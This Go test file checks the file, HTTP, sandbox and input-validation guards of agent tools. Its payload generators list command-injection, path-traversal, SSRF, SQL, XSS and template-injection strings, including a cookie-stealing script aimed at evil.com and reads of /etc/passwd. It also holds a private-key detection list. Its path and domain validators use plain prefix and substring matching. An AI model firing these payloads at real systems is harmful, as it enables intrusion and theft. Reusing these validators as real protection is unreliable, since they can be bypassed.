package tools

import (
	"context"
	"fmt"
	"io/ioutil"
	"net/http"
	"net/http/httptest"
	"os"
	"path/filepath"
	"strings"
	"testing"
	"time"

	"github.com/stretchr/testify/assert"
	"github.com/stretchr/testify/require"
)

// SecurityMode represents the security mode for operations
type SecurityMode int

const (
	// SecurityModeUnrestricted allows all operations
	SecurityModeUnrestricted SecurityMode = iota
	// SecurityModeRestricted enforces security restrictions
	SecurityModeRestricted
)

// mockSecureFileExecutor implements ToolExecutor with security controls
type mockSecureFileExecutor struct {
	mode        SecurityMode
	allowedDirs []string
}

func (e *mockSecureFileExecutor) Execute(ctx context.Context, params map[string]interface{}) (*ToolExecutionResult, error) {
	filePath, ok := params["file_path"].(string)
	if !ok {
		return nil, fmt.Errorf("file_path parameter is required")
	}
	
	// Security validation
	if e.mode == SecurityModeRestricted {
		if err := validateFilePath(filePath, e.allowedDirs); err != nil {
			return nil, err
		}
	}
	
	content, err := ioutil.ReadFile(filePath)
	if err != nil {
		return nil, err
	}
	
	return &ToolExecutionResult{
		Success: true,
		Data:    map[string]interface{}{"content": string(content)},
	}, nil
}

// mockSecureHTTPExecutor implements ToolExecutor with HTTP security controls
type mockSecureHTTPExecutor struct {
	mode           SecurityMode
	allowedDomains []string
	timeout        time.Duration
	maxSize        int64
}

func (e *mockSecureHTTPExecutor) Execute(ctx context.Context, params map[string]interface{}) (*ToolExecutionResult, error) {
	url, ok := params["url"].(string)
	if !ok {
		return nil, fmt.Errorf("url parameter is required")
	}
	
	// Security validation
	if e.mode == SecurityModeRestricted {
		if err := validateHTTPURL(url, e.allowedDomains); err != nil {
			return nil, err
		}
	}
	
	// Create HTTP client with timeout
	client := &http.Client{
		Timeout: e.timeout,
	}
	
	resp, err := client.Get(url)
	if err != nil {
		return nil, err
	}
	defer resp.Body.Close()
	
	// Read response with size limit
	body, err := ioutil.ReadAll(resp.Body)
	if err != nil {
		return nil, err
	}
	if int64(len(body)) > e.maxSize {
		return nil, fmt.Errorf("response exceeds maximum size limit")
	}
	
	return &ToolExecutionResult{
		Success: true,
		Data: map[string]interface{}{
			"body":        string(body),
			"status_code": resp.StatusCode,
		},
	}, nil
}

// mockSandboxExecutor implements ToolExecutor with sandbox controls
type mockSandboxExecutor struct {
	sandboxed bool
}

func (e *mockSandboxExecutor) Execute(ctx context.Context, params map[string]interface{}) (*ToolExecutionResult, error) {
	input, ok := params["input"].(string)
	if !ok {
		return nil, fmt.Errorf("input parameter is required")
	}
	
	// Simulate sandbox validation
	if e.sandboxed {
		// In a real implementation, this would enforce sandbox restrictions
		if strings.Contains(input, "dangerous_operation") {
			return nil, NewSecurityError("SANDBOX_VIOLATION", "Dangerous operation not allowed in sandbox")
		}
	}
	
	return &ToolExecutionResult{
		Success: true,
		Data:    map[string]interface{}{"result": fmt.Sprintf("processed: %s", input)},
	}, nil
}

// mockInputValidationExecutor implements ToolExecutor with input validation
type mockInputValidationExecutor struct{}

func (e *mockInputValidationExecutor) Execute(ctx context.Context, params map[string]interface{}) (*ToolExecutionResult, error) {
	input, ok := params["input"].(string)
	if !ok {
		return nil, fmt.Errorf("input parameter is required")
	}
	
	// Security validation
	if err := validateSecureInput(input); err != nil {
		return nil, err
	}
	
	return &ToolExecutionResult{
		Success: true,
		Data:    map[string]interface{}{"result": fmt.Sprintf("processed: %s", input)},
	}, nil
}

// TestSecureFileOperations tests the security boundaries of file operations
func TestSecureFileOperations(t *testing.T) {
	// Create test directory structure
	testDir := t.TempDir()
	allowedDir := filepath.Join(testDir, "allowed")
	restrictedDir := filepath.Join(testDir, "restricted")
	
	require.NoError(t, os.MkdirAll(allowedDir, 0755))
	require.NoError(t, os.MkdirAll(restrictedDir, 0755))
	
	// Create test files
	allowedFile := filepath.Join(allowedDir, "test.txt")
	restrictedFile := filepath.Join(restrictedDir, "secret.txt")
	
	require.NoError(t, ioutil.WriteFile(allowedFile, []byte("allowed content"), 0644))
	require.NoError(t, ioutil.WriteFile(restrictedFile, []byte("restricted content"), 0644))

	tests := []struct {
		name        string
		mode        SecurityMode
		allowedDirs []string
		filepath    string
		expectError bool
		errorType   string
	}{
		{
			name:        "unrestricted mode allows any path",
			mode:        SecurityModeUnrestricted,
			allowedDirs: nil,
			filepath:    restrictedFile,
			expectError: false,
		},
		{
			name:        "restricted mode allows whitelisted path",
			mode:        SecurityModeRestricted,
			allowedDirs: []string{allowedDir},
			filepath:    allowedFile,
			expectError: false,
		},
		{
			name:        "restricted mode blocks non-whitelisted path",
			mode:        SecurityModeRestricted,
			allowedDirs: []string{allowedDir},
			filepath:    restrictedFile,
			expectError: true,
			errorType:   "SECURITY_VIOLATION",
		},
		{
			name:        "path traversal attack blocked",
			mode:        SecurityModeRestricted,
			allowedDirs: []string{allowedDir},
			filepath:    filepath.Join(allowedDir, "../restricted/secret.txt"),
			expectError: true,
			errorType:   "SECURITY_VIOLATION",
		},
		{
			name:        "symlink attack blocked",
			mode:        SecurityModeRestricted,
			allowedDirs: []string{allowedDir},
			filepath:    filepath.Join(allowedDir, "link"),
			expectError: true,
			errorType:   "SECURITY_VIOLATION",
		},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			// Create symlink for symlink test
			if strings.Contains(tt.name, "symlink") {
				linkPath := filepath.Join(allowedDir, "link")
				os.Symlink(restrictedFile, linkPath)
				defer os.Remove(linkPath)
			}

			// Create secure file reader tool
			// Create a mock executor with security settings
			executor := &mockSecureFileExecutor{
				mode:        tt.mode,
				allowedDirs: tt.allowedDirs,
			}
			
			tool := &Tool{
				ID:   "secure_file_reader",
				Name: "Secure File Reader",
				Schema: &ToolSchema{
					Type: "object",
					Properties: map[string]*Property{
						"file_path": {
							Type: "string",
						},
					},
					Required: []string{"file_path"},
				},
				Executor: executor,
			}

			// Execute the tool
			params := map[string]interface{}{
				"file_path": tt.filepath,
			}
			
			result, err := tool.Executor.Execute(context.Background(), params)
			
			if tt.expectError {
				assert.Error(t, err)
				if tt.errorType != "" {
					assert.Contains(t, err.Error(), tt.errorType)
				}
				assert.Nil(t, result)
			} else {
				assert.NoError(t, err)
				assert.NotNil(t, result)
				assert.True(t, result.Success)
				// Verify we got the expected content
				data, ok := result.Data.(map[string]interface{})
				assert.True(t, ok, "result.Data should be a map")
				content, ok := data["content"].(string)
				assert.True(t, ok)
				if tt.filepath == allowedFile {
					assert.Equal(t, "allowed content", content)
				} else if tt.filepath == restrictedFile {
					assert.Equal(t, "restricted content", content)
				}
			}
		})
	}
}

// TestSecureHTTPOperations tests the security boundaries of HTTP operations
func TestSecureHTTPOperations(t *testing.T) {
	// Create test HTTP server
	server := httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		w.WriteHeader(http.StatusOK)
		w.Write([]byte("test response"))
	}))
	defer server.Close()

	// Create malicious server
	maliciousServer := httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		w.WriteHeader(http.StatusOK)
		w.Write([]byte("malicious response"))
	}))
	defer maliciousServer.Close()

	tests := []struct {
		name           string
		mode           SecurityMode
		allowedDomains []string
		url            string
		expectError    bool
		errorType      string
	}{
		{
			name:           "unrestricted mode allows any URL",
			mode:           SecurityModeUnrestricted,
			allowedDomains: nil,
			url:            maliciousServer.URL,
			expectError:    false,
		},
		{
			name:           "restricted mode allows whitelisted domain",
			mode:           SecurityModeRestricted,
			allowedDomains: []string{"127.0.0.1"},
			url:            server.URL,
			expectError:    false,
		},
		{
			name:           "restricted mode blocks non-whitelisted domain",
			mode:           SecurityModeRestricted,
			allowedDomains: []string{"example.com"},
			url:            server.URL,
			expectError:    true,
			errorType:      "SECURITY_VIOLATION",
		},
		{
			name:           "localhost blocked when not whitelisted",
			mode:           SecurityModeRestricted,
			allowedDomains: []string{"example.com"},
			url:            "http://localhost:8080/test",
			expectError:    true,
			errorType:      "SECURITY_VIOLATION",
		},
		{
			name:           "private IP blocked when not whitelisted",
			mode:           SecurityModeRestricted,
			allowedDomains: []string{"example.com"},
			url:            "http://192.168.1.1/test",
			expectError:    true,
			errorType:      "SECURITY_VIOLATION",
		},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			// Create a mock HTTP executor with security settings
			executor := &mockSecureHTTPExecutor{
				mode:           tt.mode,
				allowedDomains: tt.allowedDomains,
				timeout:        5 * time.Second,
				maxSize:        1024 * 1024, // 1MB
			}
			
			// Create secure HTTP client tool
			tool := &Tool{
				ID:   "secure_http_client",
				Name: "Secure HTTP Client",
				Schema: &ToolSchema{
					Type: "object",
					Properties: map[string]*Property{
						"url": {
							Type: "string",
						},
					},
					Required: []string{"url"},
				},
				Executor: executor,
			}

			// Execute the tool
			params := map[string]interface{}{
				"url": tt.url,
			}
			
			result, err := tool.Executor.Execute(context.Background(), params)
			
			if tt.expectError {
				assert.Error(t, err)
				if tt.errorType != "" {
					assert.Contains(t, err.Error(), tt.errorType)
				}
				assert.Nil(t, result)
			} else {
				assert.NoError(t, err)
				assert.NotNil(t, result)
			}
		})
	}
}

// TestSandboxExecution tests the sandbox execution boundaries
func TestSandboxExecution(t *testing.T) {
	tests := []struct {
		name        string
		toolID      string
		sandboxed   bool
		expectError bool
		errorType   string
	}{
		{
			name:        "sandboxed tool execution",
			toolID:      "sandboxed_tool",
			sandboxed:   true,
			expectError: false,
		},
		{
			name:        "unsandboxed tool execution",
			toolID:      "unsandboxed_tool",
			sandboxed:   false,
			expectError: false,
		},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			// Create tool with sandbox settings
			// Create a mock sandbox executor
			executor := &mockSandboxExecutor{
				sandboxed: tt.sandboxed,
			}
			
			tool := &Tool{
				ID:   tt.toolID,
				Name: "Test Tool",
				Schema: &ToolSchema{
					Type: "object",
					Properties: map[string]*Property{
						"input": {
							Type: "string",
						},
					},
					Required: []string{"input"},
				},
				Executor: executor,
			}

			// Test normal execution
			params := map[string]interface{}{
				"input": "safe_input",
			}
			
			result, err := tool.Executor.Execute(context.Background(), params)
			assert.NoError(t, err)
			assert.NotNil(t, result)
			assert.True(t, result.Success)
			data, ok := result.Data.(map[string]interface{})
			assert.True(t, ok)
			assert.Equal(t, "processed: safe_input", data["result"])

			// Test dangerous operation in sandbox
			if tt.sandboxed {
				dangerousArgs := map[string]interface{}{
					"input": "dangerous_operation",
				}
				
				result, err := tool.Executor.Execute(context.Background(), dangerousArgs)
				assert.Error(t, err)
				assert.Contains(t, err.Error(), "SANDBOX_VIOLATION")
				assert.Nil(t, result)
			}
		})
	}
}

// TestInputValidationSecurity tests input validation security
func TestInputValidationSecurity(t *testing.T) {
	tests := []struct {
		name        string
		input       interface{}
		expectError bool
		errorType   string
	}{
		{
			name:        "valid input",
			input:       "safe input",
			expectError: false,
		},
		{
			name:        "script injection attempt",
			input:       "<script>alert('xss')</script>",
			expectError: true,
			errorType:   "VALIDATION_ERROR",
		},
		{
			name:        "SQL injection attempt",
			input:       "'; DROP TABLE users; --",
			expectError: true,
			errorType:   "VALIDATION_ERROR",
		},
		{
			name:        "command injection attempt",
			input:       "test; rm -rf /",
			expectError: true,
			errorType:   "VALIDATION_ERROR",
		},
		{
			name:        "path traversal attempt",
			input:       "../../etc/passwd",
			expectError: true,
			errorType:   "VALIDATION_ERROR",
		},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			// Create a mock input validation executor
			executor := &mockInputValidationExecutor{}
			
			// Create tool with security validation
			tool := &Tool{
				ID:   "secure_input_tool",
				Name: "Secure Input Tool",
				Schema: &ToolSchema{
					Type: "object",
					Properties: map[string]*Property{
						"input": {
							Type: "string",
						},
					},
					Required: []string{"input"},
				},
				Executor: executor,
			}

			// Execute the tool
			params := map[string]interface{}{
				"input": tt.input,
			}
			
			result, err := tool.Executor.Execute(context.Background(), params)
			
			if tt.expectError {
				assert.Error(t, err)
				if tt.errorType != "" {
					assert.Contains(t, err.Error(), tt.errorType)
				}
				assert.Nil(t, result)
			} else {
				assert.NoError(t, err)
				assert.NotNil(t, result)
			}
		})
	}
}

// Helper functions for security validation

func validateFilePath(filePath string, allowedDirs []string) error {
	// Resolve the path to prevent path traversal attacks
	resolvedPath, err := filepath.Abs(filePath)
	if err != nil {
		return NewSecurityError("SECURITY_VIOLATION", "Invalid file path")
	}

	// Check if path is within allowed directories
	for _, allowedDir := range allowedDirs {
		resolvedAllowedDir, err := filepath.Abs(allowedDir)
		if err != nil {
			continue
		}
		
		if strings.HasPrefix(resolvedPath, resolvedAllowedDir) {
			return nil
		}
	}
	
	return NewSecurityError("SECURITY_VIOLATION", "File path not in allowed directories")
}

func validateHTTPURL(url string, allowedDomains []string) error {
	// Parse URL
	for _, domain := range allowedDomains {
		if strings.Contains(url, domain) {
			return nil
		}
	}
	
	return NewSecurityError("SECURITY_VIOLATION", "Domain not in allowed list")
}

func validateSecureInput(input string) error {
	// Check for common injection patterns
	dangerousPatterns := []string{
		"<script",
		"javascript:",
		"'; DROP",
		"rm -rf",
		"../",
		"..\\",
	}
	
	for _, pattern := range dangerousPatterns {
		if strings.Contains(strings.ToLower(input), strings.ToLower(pattern)) {
			return NewValidationError("VALIDATION_ERROR", "Potentially dangerous input detected", "secure_input_tool")
		}
	}
	
	return nil
}

// NewSecurityError creates a new security error
func NewSecurityError(code, message string) error {
	return &ToolError{
		Code:      code,
		Message:   message,
		Details:   map[string]interface{}{"type": "security_violation"},
		Timestamp: time.Now(),
	}
}

// SecurityTestUtils provides utilities for security testing
type SecurityTestUtils struct {
	tempDir   string
	cleanupFn func()
}

// NewSecurityTestUtils creates a new security test utilities instance
func NewSecurityTestUtils(t *testing.T) *SecurityTestUtils {
	tempDir, err := os.MkdirTemp("", "security_test_utils")
	if err != nil {
		t.Fatalf("Failed to create temp directory: %v", err)
	}

	return &SecurityTestUtils{
		tempDir: tempDir,
		cleanupFn: func() {
			os.RemoveAll(tempDir)
		},
	}
}

// Cleanup removes temporary test resources
func (u *SecurityTestUtils) Cleanup() {
	if u.cleanupFn != nil {
		u.cleanupFn()
	}
}

// GetTempDir returns the temporary directory path
func (u *SecurityTestUtils) GetTempDir() string {
	return u.tempDir
}

// CreateTestFile creates a test file with specified content
func (u *SecurityTestUtils) CreateTestFile(t *testing.T, filename, content string) string {
	filePath := filepath.Join(u.tempDir, filename)
	
	// Create directory if needed
	dir := filepath.Dir(filePath)
	if err := os.MkdirAll(dir, 0755); err != nil {
		t.Fatalf("Failed to create directory %s: %v", dir, err)
	}

	if err := os.WriteFile(filePath, []byte(content), 0644); err != nil {
		t.Fatalf("Failed to create test file %s: %v", filePath, err)
	}

	return filePath
}

// CreateTestSymlink creates a symbolic link for testing
func (u *SecurityTestUtils) CreateTestSymlink(t *testing.T, linkName, target string) string {
	linkPath := filepath.Join(u.tempDir, linkName)
	
	if err := os.Symlink(target, linkPath); err != nil {
		t.Skipf("Cannot create symlink (may not be supported): %v", err)
	}

	return linkPath
}

// CreateTestDirectory creates a test directory
func (u *SecurityTestUtils) CreateTestDirectory(t *testing.T, dirName string) string {
	dirPath := filepath.Join(u.tempDir, dirName)
	
	if err := os.MkdirAll(dirPath, 0755); err != nil {
		t.Fatalf("Failed to create directory %s: %v", dirPath, err)
	}

	return dirPath
}

// PayloadGenerator generates various types of malicious payloads for testing
type PayloadGenerator struct{}

// NewPayloadGenerator creates a new payload generator
func NewPayloadGenerator() *PayloadGenerator {
	return &PayloadGenerator{}
}

// GeneratePathTraversalPayloads generates path traversal attack payloads
func (g *PayloadGenerator) GeneratePathTraversalPayloads() []string {
	return []string{
		"../../../etc/passwd",
		"..\\..\\..\\windows\\system32\\config\\sam",
		"..%2f..%2f..%2fetc%2fpasswd",
		"..%252f..%252f..%252fetc%252fpasswd",
		"..%c0%af..%c0%af..%c0%afetc%c0%afpasswd",
		"%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",
		"................/etc/passwd",
		".. /.. /.. /etc/passwd",
		"~/../../etc/passwd",
		"./../../etc/passwd",
		"..///..///..///etc//passwd",
		"file.txt\x00../../../etc/passwd",
		"file.txt; cat /etc/passwd",
		"file.txt && cat /etc/passwd",
		"file.txt || cat /etc/passwd",
		"file.txt | cat /etc/passwd",
		"file.txt & cat /etc/passwd",
		"file.txt`cat /etc/passwd`",
		"file.txt$(cat /etc/passwd)",
		"file.txt\ncat /etc/passwd",
		"file.txt\rcat /etc/passwd",
		"file.txt\tcat /etc/passwd",
	}
}

// GenerateCommandInjectionPayloads generates command injection payloads
func (g *PayloadGenerator) GenerateCommandInjectionPayloads() []string {
	return []string{
		"; cat /etc/passwd",
		"&& cat /etc/passwd",
		"|| cat /etc/passwd",
		"| cat /etc/passwd",
		"& cat /etc/passwd",
		"`cat /etc/passwd`",
		"$(cat /etc/passwd)",
		"\ncat /etc/passwd",
		"\rcat /etc/passwd",
		"\tcat /etc/passwd",
		"\x00cat /etc/passwd",
		"> /etc/passwd",
		"< /etc/passwd",
		"${PATH}",
		"$HOME",
		"${IFS}cat${IFS}/etc/passwd",
		"*",
		"?",
		"[a-z]*",
		"\\; cat /etc/passwd",
		"\"; cat /etc/passwd",
		"'; cat /etc/passwd",
		"%3Bcat%20/etc/passwd",
		"；cat /etc/passwd", // Unicode semicolon
	}
}

// GenerateURLInjectionPayloads generates URL injection attack payloads
func (g *PayloadGenerator) GenerateURLInjectionPayloads() []string {
	return []string{
		"javascript:alert('XSS')",
		"data:text/html,<script>alert('XSS')</script>",
		"http://evil.com",
		"https://evil.com",
		"ftp://evil.com",
		"file:///etc/passwd",
		"http://127.0.0.1:8080/admin",
		"http://localhost/admin",
		"http://169.254.169.254/metadata",
		"http://[::1]/admin",
		"http://0.0.0.0/admin",
		"http://192.168.1.1/router",
		"http://10.0.0.1/internal",
		"http://172.16.0.1/internal",
	}
}

// GenerateSQLInjectionPayloads generates SQL injection attack payloads
func (g *PayloadGenerator) GenerateSQLInjectionPayloads() []string {
	return []string{
		"' OR 1=1 --",
		"' OR '1'='1",
		"'; DROP TABLE users; --",
		"1' UNION SELECT null,username,password FROM users --",
		"admin'--",
		"admin' #",
		"admin'/*",
		"' OR 1=1#",
		"' OR 1=1/*",
		"') OR ('1'='1",
		"' OR 1=1 LIMIT 1 --",
		"1'; WAITFOR DELAY '00:00:05' --",
	}
}

// GenerateXSSPayloads generates XSS attack payloads
func (g *PayloadGenerator) GenerateXSSPayloads() []string {
	return []string{
		"<script>alert('XSS')</script>",
		"<img src=x onerror=alert('XSS')>",
		"<svg onload=alert('XSS')>",
		"<iframe src=javascript:alert('XSS')>",
		"<body onload=alert('XSS')>",
		"<input type=text onkeyup=alert('XSS')>",
		"<a href=javascript:alert('XSS')>click</a>",
		"javascript:alert('XSS')",
		"data:text/html,<script>alert('XSS')</script>",
		"<script>document.location='http://evil.com/'+document.cookie</script>",
		"<object data='javascript:alert(\"XSS\")'></object>",
		"<embed src='javascript:alert(\"XSS\")'></embed>",
	}
}

// GenerateTemplateInjectionPayloads generates template injection attack payloads
func (g *PayloadGenerator) GenerateTemplateInjectionPayloads() []string {
	return []string{
		"{{7*7}}",
		"${7*7}",
		"#{7*7}",
		"<%= 7*7 %>",
		"{{config}}",
		"{{request}}",
		"{{self}}",
		"${config}",
		"${request}",
		"${self}",
		"{{''.__class__.__mro__[2].__subclasses__()[40]('/etc/passwd').read()}}",
		"${''.__class__.__mro__[2].__subclasses__()[40]('/etc/passwd').read()}",
		"<#assign ex=\"freemarker.template.utility.Execute\"?new()>${ex(\"cat /etc/passwd\")}",
	}
}

// SecurityTestValidator validates security test results
type SecurityTestValidator struct{}

// NewSecurityTestValidator creates a new security test validator
func NewSecurityTestValidator() *SecurityTestValidator {
	return &SecurityTestValidator{}
}

// ValidateSecurityBlocking validates that security measures are blocking threats
func (v *SecurityTestValidator) ValidateSecurityBlocking(t *testing.T, result *ToolExecutionResult, err error, expectBlocked bool) {
	if expectBlocked {
		if err == nil && result.Success {
			t.Error("Expected security measure to block the operation")
		} else {
			t.Logf("Security measure successfully blocked the operation")
		}
	} else {
		if err != nil {
			t.Errorf("Unexpected error in allowed operation: %v", err)
		}
		if result == nil || !result.Success {
			t.Error("Expected allowed operation to succeed")
		}
	}
}

// ValidateErrorMessage validates that error messages contain expected content
func (v *SecurityTestValidator) ValidateErrorMessage(t *testing.T, result *ToolExecutionResult, expectedError string) {
	if result == nil {
		t.Error("Expected result to be non-nil for error validation")
		return
	}

	if expectedError != "" && !strings.Contains(result.Error, expectedError) {
		t.Errorf("Expected error containing '%s', got: %s", expectedError, result.Error)
	}
}

// ValidateNoDataLeakage validates that no sensitive data is leaked in results
func (v *SecurityTestValidator) ValidateNoDataLeakage(t *testing.T, result *ToolExecutionResult) {
	if result == nil {
		return
	}

	// Check for common sensitive data patterns
	sensitivePatterns := []string{
		"password",
		"secret",
		"token",
		"key",
		"private",
		"confidential",
		"/etc/passwd",
		"/etc/shadow",
		"id_rsa",
		"id_dsa",
		"SSH PRIVATE KEY",
		"BEGIN RSA PRIVATE KEY",
		"BEGIN DSA PRIVATE KEY",
		"BEGIN EC PRIVATE KEY",
		"BEGIN OPENSSH PRIVATE KEY",
		"BEGIN PGP PRIVATE KEY",
	}

	// Convert result to string for pattern matching
	resultStr := fmt.Sprintf("%+v", result)
	resultStr = strings.ToLower(resultStr)

	for _, pattern := range sensitivePatterns {
		if strings.Contains(resultStr, strings.ToLower(pattern)) {
			t.Errorf("Potential sensitive data leakage detected: %s", pattern)
		}
	}
}

// CreateMockExecutor creates a mock executor for testing
func (h *SecurityTestUtils) CreateMockExecutor(shouldSucceed bool, resultData interface{}) ToolExecutor {
	return &mockExecutorForUtils{
		shouldSucceed: shouldSucceed,
		resultData:    resultData,
	}
}

// mockExecutorForUtils is a mock implementation of ToolExecutor for testing
type mockExecutorForUtils struct {
	shouldSucceed bool
	resultData    interface{}
}

func (m *mockExecutorForUtils) Execute(ctx context.Context, params map[string]interface{}) (*ToolExecutionResult, error) {
	if m.shouldSucceed {
		return &ToolExecutionResult{
			Success: true,
			Data:    m.resultData,
		}, nil
	} else {
		return &ToolExecutionResult{
			Success: false,
			Error:   "mock execution failed",
		}, nil
	}
}